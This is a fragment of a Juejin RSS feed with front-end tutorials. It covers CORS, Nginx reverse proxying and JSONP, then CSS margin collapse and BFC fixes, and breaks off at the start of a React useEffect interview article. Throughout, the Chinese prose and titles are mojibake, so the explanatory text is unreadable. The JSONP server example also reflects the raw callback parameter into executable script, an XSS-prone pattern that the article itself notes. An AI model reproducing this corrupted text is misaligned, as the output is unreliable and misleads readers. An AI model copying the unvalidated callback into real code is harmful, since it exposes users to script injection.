  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'åç«¯æœåŠ¡è¿è¡Œåœ¨ 3000 ç«¯å£'</span>);
});
</code></pre>
<p>é…ç½®åï¼Œåç«¯å“åº”å¤´ä¼šåŒ…å« <code>Access-Control-Allow-Origin</code> ç­‰å­—æ®µï¼Œæµè§ˆå™¨è¯†åˆ«åˆ°è¿™äº›å­—æ®µå°±ä¼šå…è®¸è·¨åŸŸè¯·æ±‚ã€‚</p>
<h3 data-id="heading-4">Nginx åå‘ä»£ç†</h3>
<p>ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œå‰ç«¯è¯·æ±‚å‘é€åˆ° Nginx æœåŠ¡å™¨ï¼ˆä¸å‰ç«¯åŒæºï¼‰ï¼ŒNginx å†å°†è¯·æ±‚è½¬å‘åˆ°åç«¯æœåŠ¡ï¼Œåç«¯å“åº”æ•°æ®ä¹Ÿé€šè¿‡ Nginx è¿”å›ç»™å‰ç«¯ã€‚æµè§ˆå™¨åªä¸ Nginx äº¤äº’ï¼Œä¸ç›´æ¥ä¸åç«¯é€šä¿¡ï¼Œè€ŒæœåŠ¡å™¨ä¸æœåŠ¡å™¨ä¹‹é—´æ²¡æœ‰ â€œåŒæºç­–ç•¥â€ é™åˆ¶ï¼Œä¹Ÿå°±ä¸å­˜åœ¨è·¨åŸŸé—®é¢˜ã€‚</p>
<pre><code class="hljs language-nginx" lang="nginx"># åå‘ä»£ç†ï¼šæ‰€æœ‰ä»¥ /api å¼€å¤´çš„è¯·æ±‚è½¬å‘åˆ°åç«¯ 3000 ç«¯å£
location /api/ {
    proxy_pass http://127.0.0.1:3000;  # åç«¯æœåŠ¡åœ°å€ï¼ˆæœåŠ¡å™¨æœ¬åœ°ï¼‰
    
    # ä¼ é€’è¯·æ±‚å¤´ä¿¡æ¯ï¼ˆå¿…é¡»é…ç½®ï¼Œå¦åˆ™åç«¯å¯èƒ½æ— æ³•è·å–æ­£ç¡®çš„å®¢æˆ·ç«¯ä¿¡æ¯ï¼‰
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
}
</code></pre>
<h3 data-id="heading-5">JSONP</h3>
<p>æµè§ˆå™¨ä¸­æœ‰ä¸€äº›æ ‡ç­¾å¤©ç”Ÿå…·æœ‰è·¨åŸŸèƒ½åŠ›ï¼Œå¦‚ï¼š<code>img</code>ã€<code>link</code>ã€<code>iframe</code>ã€<code>script</code> ç­‰ï¼ŒJSONP å°±æ˜¯åˆ©ç”¨äº† <code>script</code> æ ‡ç­¾ä¸å—åŒæºç­–ç•¥é™åˆ¶çš„ç‰¹æ€§ã€‚</p>
<ol>
<li>å‰ç«¯æå‰å®šä¹‰å›è°ƒå‡½æ•° <code>fn</code>ï¼Œå¹¶åŠ¨æ€åˆ›å»º <code>script</code> æ ‡ç­¾ï¼Œè®¾ç½® <code>src</code> ä¸º <code>æ¥å£åœ°å€?callback=fn</code>ã€‚</li>
<li>åç«¯è·å–è¯·æ±‚å‚æ•° <code>callback</code>ï¼Œè¿”å›è¯¥å›è°ƒå‡½æ•°çš„è°ƒç”¨å­—ç¬¦ä¸² <code>'fn(data)'</code>ã€‚</li>
<li>æµè§ˆå™¨è·å–åˆ° <code>script</code> æ ‡ç­¾çš„è¿”å›å†…å®¹ï¼ˆå³ <code>'fn(data)'</code>ï¼‰å¹¶è§£ææ‰§è¡Œï¼Œå›è°ƒå‡½æ•° <code>fn</code> åœ¨å‰ç«¯è¢«è°ƒç”¨ï¼Œå°±å¯ä»¥è·å–åˆ°åç«¯è¿”å›çš„ <code>data</code>ã€‚</li>
</ol>
<p>å‰ç«¯ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æå‰å®šä¹‰å¥½çš„å›è°ƒå‡½æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">handleData</span>(<span class="hljs-params">data</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'è·å–åˆ°çš„è·¨åŸŸæ•°æ®ï¼š'</span>, data);
}

<span class="hljs-comment">// åŠ¨æ€åˆ›å»º script æ ‡ç­¾</span>
<span class="hljs-keyword">const</span> script = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'script'</span>);
script.<span class="hljs-property">src</span> = <span class="hljs-string">'http://localhost:3000/api/users?callback=handleData'</span>;

<span class="hljs-comment">// å°† script æ·»åŠ åˆ° bodyï¼Œå‘é€ get è¯·æ±‚</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(script);
</code></pre>
<p>åç«¯ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-js" lang="js">app.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/api/users'</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
  <span class="hljs-comment">// è·å–å›è°ƒå‡½æ•°å</span>
  <span class="hljs-keyword">const</span> callback = req.<span class="hljs-property">query</span>.<span class="hljs-property">callback</span>;
  <span class="hljs-keyword">const</span> data = { <span class="hljs-attr">code</span>: <span class="hljs-number">200</span>, <span class="hljs-attr">data</span>: [{ <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'å¼ ä¸‰'</span> }] };
  <span class="hljs-comment">// è¿”å› `å›è°ƒå‡½æ•°(data)` æ ¼å¼çš„å­—ç¬¦ä¸²</span>
  <span class="hljs-comment">// å‰ç«¯ script æ ‡ç­¾æ‹¿åˆ°è¿”å›å†…å®¹ï¼Œä¼šå°†å­—ç¬¦ä¸²å½“ä½œè„šæœ¬æ‰§è¡Œï¼Œå›è°ƒå‡½æ•°å°±ä¼šåœ¨å‰ç«¯è¢«è°ƒç”¨</span>
  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">`<span class="hljs-subst">${callback}</span>(<span class="hljs-subst">${<span class="hljs-built_in">JSON</span>.stringify(data)}</span>)`</span>);
});
</code></pre>
<p>JSONP æ˜¯ä¼ ç»Ÿæ–¹æ¡ˆï¼Œå±€é™æ€§å¤§ï¼Œä»…æ”¯æŒ <code>GET</code> è¯·æ±‚ï¼ˆå› ä¸º <code>script</code> æ ‡ç­¾åªæ”¯æŒ <code>GET</code> è¯·æ±‚ï¼‰ï¼Œä¸”å­˜åœ¨å®‰å…¨é£é™©ï¼ˆå¯èƒ½é­å— XSS æ”»å‡»ï¼‰ï¼Œå·²è¢« CORS å’Œ Nginx åå‘ä»£ç†æ›¿ä»£ï¼Œä»…åœ¨å…¼å®¹è€æ—§æµè§ˆå™¨åœºæ™¯ä¸‹å¶å°”ä½¿ç”¨ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»€ä¹ˆæ˜¯marginé‡å ï¼Œå¦‚ä½•è§£å†³]]></title>    <link>https://juejin.cn/post/7589110783146639394</link>    <guid>https://juejin.cn/post/7589110783146639394</guid>    <pubDate>2025-12-29T15:09:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589110783146639394" data-draft-id="7589126814829756468" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»€ä¹ˆæ˜¯marginé‡å ï¼Œå¦‚ä½•è§£å†³"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-29T15:09:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä»£ç çŒäºº"/> <meta itemprop="url" content="https://juejin.cn/user/624972624037374"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»€ä¹ˆæ˜¯marginé‡å ï¼Œå¦‚ä½•è§£å†³
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/624972624037374/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä»£ç çŒäºº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T15:09:32.000Z" title="Mon Dec 29 2025 15:09:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">ä»€ä¹ˆæ˜¯ Margin é‡å ï¼Ÿ</h3>
<p><strong>Margin é‡å ï¼ˆMargin Collapseï¼‰</strong> Â æ˜¯æŒ‡å½“ä¸¤ä¸ªæˆ–å¤šä¸ª<strong>å‚ç›´æ–¹å‘</strong>ï¼ˆä¸Šä¸‹ï¼‰çš„å—çº§å…ƒç´ çš„ margin ç›¸é‡æ—¶ï¼Œå®ƒä»¬ä¼šåˆå¹¶æˆä¸€ä¸ª marginï¼Œå…¶å¤§å°ä¸ºä¸¤è€…ä¸­è¾ƒå¤§çš„é‚£ä¸ªå€¼ã€‚è¿™ä¸ªç‰¹æ€§åªå‘ç”Ÿåœ¨<strong>æ ‡å‡†æ–‡æ¡£æµ</strong>ä¸­çš„<strong>å‚ç›´æ–¹å‘</strong>ï¼Œæ°´å¹³æ–¹å‘çš„ margin ä¸ä¼šé‡å ã€‚</p>
<h4 data-id="heading-1">å‘ç”Ÿåœºæ™¯</h4>
<p>ä¸»è¦æœ‰ä¸‰ç§æƒ…å†µï¼š</p>
<p><strong>1. ç›¸é‚»å…„å¼Ÿå…ƒç´ </strong><br/>
ä¸¤ä¸ªä¸Šä¸‹ç›¸é‚»çš„å…„å¼Ÿå…ƒç´ ï¼Œå®ƒä»¬ä¹‹é—´çš„å‚ç›´é—´è·ä¸æ˜¯Â <code>ä¸Šmargin-bottom + ä¸‹margin-top</code>ï¼Œè€Œæ˜¯å–ä¸¤è€…çš„<strong>æœ€å¤§å€¼</strong>ã€‚</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
  <span class="hljs-selector-class">.box1</span> { <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">30px</span>; }
  <span class="hljs-selector-class">.box2</span> { <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">20px</span>; }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"box1"</span>&gt;</span>Box 1<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"box2"</span>&gt;</span>Box 2<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>æœ€ç»ˆä¸¤ä¸ªç›’å­ä¹‹é—´çš„è·ç¦»æ˜¯Â <code>30px</code>ï¼ˆ<code>max(30px, 20px)</code>ï¼‰ï¼Œè€Œä¸æ˜¯Â <code>50px</code>ã€‚</p>
<p><strong>2. çˆ¶å­å…ƒç´ ï¼ˆç¬¬ä¸€ä¸ª/æœ€åä¸€ä¸ªå­å…ƒç´ ï¼‰</strong><br/>
å½“çˆ¶å…ƒç´ æ²¡æœ‰æœ‰æ•ˆçš„è¾¹æ¡†ï¼ˆborderï¼‰ã€å†…è¾¹è·ï¼ˆpaddingï¼‰ã€å†…å®¹ï¼ˆheightä¸º0ï¼‰æˆ–BFCï¼ˆè§ä¸‹æ–‡ï¼‰éš”å¼€æ—¶ï¼Œçˆ¶å…ƒç´ çš„Â <code>margin-top</code>Â å’Œå…¶ç¬¬ä¸€ä¸ªå­å…ƒç´ çš„Â <code>margin-top</code>Â ä¼šå‘ç”Ÿé‡å ã€‚<code>margin-bottom</code>Â ä¸æœ€åä¸€ä¸ªå­å…ƒç´ çš„Â <code>margin-bottom</code>Â åŒç†ã€‚</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
  <span class="hljs-selector-class">.parent</span> { <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">30px</span>; <span class="hljs-attribute">background</span>: <span class="hljs-number">#eee</span>; }
  <span class="hljs-selector-class">.child</span> { <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">20px</span>; <span class="hljs-attribute">height</span>: <span class="hljs-number">50px</span>; <span class="hljs-attribute">background</span>: <span class="hljs-number">#ccc</span>; }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"parent"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"child"</span>&gt;</span>Child<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>è§†è§‰ä¸Šï¼Œçˆ¶å…ƒç´ å’Œå­å…ƒç´ ä¼šä¸€èµ·è´´ç€é¡¶éƒ¨ï¼Œå®ƒä»¬ä¹‹é—´çš„é¡¶éƒ¨é—´è·æ˜¯Â <code>30px</code>ï¼ˆå–æœ€å¤§å€¼ï¼‰ï¼Œçœ‹èµ·æ¥åƒæ˜¯çˆ¶å…ƒç´ çš„Â <code>margin-top</code>Â è¢«å­å…ƒç´ â€œå·èµ°â€äº†ã€‚</p>
<p><strong>3. ç©ºçš„å—çº§å…ƒç´ </strong><br/>
å¦‚æœä¸€ä¸ªå—çº§å…ƒç´ æ²¡æœ‰å†…å®¹ã€è¾¹æ¡†ã€å†…è¾¹è·æˆ–é«˜åº¦ï¼Œé‚£ä¹ˆå®ƒè‡ªèº«çš„Â <code>margin-top</code>Â å’ŒÂ <code>margin-bottom</code>Â ä¼šé‡å ã€‚</p>
<h3 data-id="heading-2">å¦‚ä½•è§£å†³ Margin é‡å ï¼Ÿ</h3>
<p>è§£å†³æ€è·¯çš„æ ¸å¿ƒæ˜¯<strong>ç ´åå®ƒå‘ç”Ÿçš„æ¡ä»¶</strong>ã€‚æœ€é€šç”¨ã€æœ€æ ‡å‡†çš„æ–¹æ³•æ˜¯åˆ›å»º BFCã€‚</p>
<h4 data-id="heading-3">ä¸»è¦è§£å†³æ–¹æ¡ˆ</h4>
<p><strong>1. åˆ›å»º BFCï¼ˆå—æ ¼å¼åŒ–ä¸Šä¸‹æ–‡ï¼‰</strong><br/>
ä¸ºçˆ¶å…ƒç´ æˆ–ç›¸å…³å…ƒç´ åˆ›å»ºä¸€ä¸ªæ–°çš„ BFCï¼Œå¯ä»¥ä½¿å…¶å†…éƒ¨å¸ƒå±€ä¸å¤–éƒ¨éš”ç¦»ï¼Œä»è€Œé˜»æ­¢ margin é‡å ã€‚<br/>
å¸¸è§åˆ›å»º BFC çš„æ–¹æ³•ï¼š</p>
<ul>
<li>è®¾ç½®Â <code>overflow</code>Â ä¸ºÂ <code>hidden</code>ã€<code>auto</code>Â æˆ–Â <code>scroll</code>ï¼ˆæ³¨æ„å¯èƒ½å¸¦æ¥è£å‰ªæˆ–æ»šåŠ¨æ¡ï¼‰ã€‚</li>
<li>è®¾ç½®Â <code>display</code>Â ä¸ºÂ <code>flow-root</code>ï¼ˆ<strong>æœ€æ¨è</strong>ï¼Œä¸“ä¸ºåˆ›å»º BFC è®¾è®¡ï¼Œæ— å‰¯ä½œç”¨ï¼‰ã€‚</li>
<li>è®¾ç½®æµ®åŠ¨ (<code>float: left/right</code>ï¼Œä½†ä¼šè„±ç¦»æ–‡æ¡£æµ)ã€‚</li>
<li>è®¾ç½®ç»å¯¹å®šä½ (<code>position: absolute/fixed</code>)ã€‚</li>
<li>è®¾ç½®Â <code>display</code>Â ä¸ºÂ <code>inline-block</code>ã€<code>flex</code>ã€<code>grid</code>ã€<code>table</code>Â ç­‰ã€‚</li>
</ul>
<p><strong>é’ˆå¯¹çˆ¶å­é‡å çš„è§£å†³ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
  <span class="hljs-selector-class">.parent</span> {
    <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">30px</span>;
    <span class="hljs-attribute">background</span>: <span class="hljs-number">#eee</span>;
    <span class="hljs-comment">/* ä»»é€‰ä¸€ç§åˆ›å»ºBFCçš„æ–¹æ³• */</span>
    <span class="hljs-attribute">overflow</span>: hidden; <span class="hljs-comment">/* æˆ– auto */</span>
    <span class="hljs-comment">/* æˆ–è€… */</span>
    <span class="hljs-attribute">display</span>: flow-root; <span class="hljs-comment">/* æ— å‰¯ä½œç”¨ï¼Œæœ€ä½³å®è·µ */</span>
  }
  <span class="hljs-selector-class">.child</span> {
    <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">20px</span>;
    <span class="hljs-attribute">height</span>: <span class="hljs-number">50px</span>;
    <span class="hljs-attribute">background</span>: <span class="hljs-number">#ccc</span>;
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"parent"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"child"</span>&gt;</span>Child<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>ç°åœ¨ï¼Œçˆ¶å…ƒç´ çš„Â <code>margin-top</code>Â æ˜¯ 30pxï¼Œå­å…ƒç´ çš„Â <code>margin-top</code>Â æ˜¯ 20pxï¼Œä¸¤è€…ä¸å†é‡å ï¼Œæ€»çš„ä¸Šè¾¹è·ä¸º 50pxã€‚</p>
<p><strong>2. ä½¿ç”¨ Padding æˆ– Border éš”å¼€</strong><br/>
åœ¨çˆ¶å…ƒç´ ä¸Šä½¿ç”¨Â <code>padding</code>Â æˆ–Â <code>border</code>Â å¯ä»¥ç‰©ç†ä¸Šé˜»æ­¢å­å…ƒç´ çš„ margin ä¸å¤–éƒ¨åˆå¹¶ã€‚</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.parent</span> {
  <span class="hljs-attribute">padding-top</span>: <span class="hljs-number">1px</span>; <span class="hljs-comment">/* æˆ– border-top: 1px solid transparent; */</span>
}
</code></pre>
<p><strong>3. ä½¿ç”¨å†…è”å…ƒç´ éš”æ–­</strong><br/>
åœ¨ä¸¤ä¸ªç›¸é‚»å…ƒç´ ä¹‹é—´æ’å…¥ä¸€ä¸ªå†…è”å…ƒç´ æˆ–æ³¨é‡Šç­‰ï¼Œä½†è¿™ç§æ–¹æ³•ä¸å¸¸ç”¨ä¸”ä¸ä¼˜é›…ã€‚</p>
<p><strong>4. ä½¿ç”¨ Flexbox æˆ– Grid å¸ƒå±€</strong><br/>
å°†çˆ¶å…ƒç´ çš„Â <code>display</code>Â è®¾ç½®ä¸ºÂ <code>flex</code>Â æˆ–Â <code>grid</code>ï¼Œè¿™ä¼šåˆ›å»ºæ–°çš„å¸ƒå±€ä¸Šä¸‹æ–‡ï¼Œå…¶å­å…ƒç´ çš„ margin ä¸ä¼šä¸å¤–éƒ¨å‘ç”Ÿé‡å ã€‚</p>
<h3 data-id="heading-4">æ€»ç»“ä¸å»ºè®®</h3>
<ul>
<li>
<p><strong>ç†è§£è€Œéæ­»è®°</strong>ï¼šç†è§£ margin é‡å æ˜¯ CSS è§„èŒƒçš„ä¸€éƒ¨åˆ†ï¼Œæœ‰æ—¶å®ƒæ˜¯æœ‰ç”¨çš„ï¼ˆå¦‚æ®µè½é—´è·ï¼‰ï¼Œå¹¶éæ€»æ˜¯â€œé—®é¢˜â€ã€‚</p>
</li>
<li>
<p><strong>ä½•æ—¶éœ€è¦è§£å†³</strong>ï¼šå½“ margin é‡å å¯¼è‡´ä½ çš„å¸ƒå±€è®¡ç®—ä¸å®é™…æ•ˆæœä¸ç¬¦ï¼Œéœ€è¦ç²¾ç¡®æ§åˆ¶é—´è·æ—¶ã€‚</p>
</li>
<li>
<p><strong>æœ€ä½³å®è·µ</strong>ï¼š</p>
<ol>
<li><strong>å¯¹äºçˆ¶å­é‡å </strong>ï¼Œä¼˜å…ˆè€ƒè™‘ä¸ºçˆ¶å…ƒç´ è®¾ç½®Â <code>display: flow-root;</code>Â æ¥åˆ›å»º BFCï¼Œè¿™æ˜¯æœ€å¹²å‡€ä¸”æ— å‰¯ä½œç”¨çš„æ–¹å¼ã€‚</li>
<li><strong>å¯¹äºå…„å¼Ÿé‡å </strong>ï¼Œå¦‚æœç¡®å®éœ€è¦è§£å†³ï¼Œå¯ä»¥å°†å…¶ä¸­ä¸€ä¸ªå…ƒç´ åŒ…è£¹åœ¨ä¸€ä¸ªåˆ›å»ºäº† BFC çš„å®¹å™¨ä¸­ã€‚</li>
<li>åœ¨å®é™…å¼€å‘ä¸­ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨ CSS Reset æˆ–ç°ä»£æ¡†æ¶ï¼ˆå¦‚ Tailwind CSSï¼‰çš„é—´è·ç³»ç»Ÿæ¥é¿å…å¤æ‚çš„ margin é‡å é—®é¢˜ã€‚</li>
</ol>
</li>
</ul>
<p>ç®€å•æ¥è¯´ï¼Œ<strong><code>display: flow-root;</code>Â æ˜¯è§£å†³ margin é‡å é—®é¢˜æœ€ç°ä»£ã€æœ€å®‰å…¨çš„ CSS æ–¹æ³•</strong>ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€react é«˜é¢‘é¢è¯•é¢˜â€”æ ¸å¿ƒåŸç†ç¯‡ã€‘ï¼šuseEffect çš„ä¾èµ–é¡¹å¦‚æœæ˜¯æ•°ç»„æˆ–å¯¹è±¡ï¼ˆå¼•ç”¨ç±»å‹ï¼‰ï¼Œä¼šæœ‰ä»€ä¹ˆé—®é¢˜ï¼Ÿå¦‚ä½•è§£å†³ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7589126920286666762</link>    <guid>https://juejin.cn/post/7589126920286666762</guid>    <pubDate>2025-12-29T15:47:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589126920286666762" data-draft-id="7589092567545135113" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€react é«˜é¢‘é¢è¯•é¢˜â€”æ ¸å¿ƒåŸç†ç¯‡ã€‘ï¼šuseEffect çš„ä¾èµ–é¡¹å¦‚æœæ˜¯æ•°ç»„æˆ–å¯¹è±¡ï¼ˆå¼•ç”¨ç±»å‹ï¼‰ï¼Œä¼šæœ‰ä»€ä¹ˆé—®é¢˜ï¼Ÿå¦‚ä½•è§£å†³ï¼Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯,é¢è¯•,React.js"/> <meta itemprop="datePublished" content="2025-12-29T15:47:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" 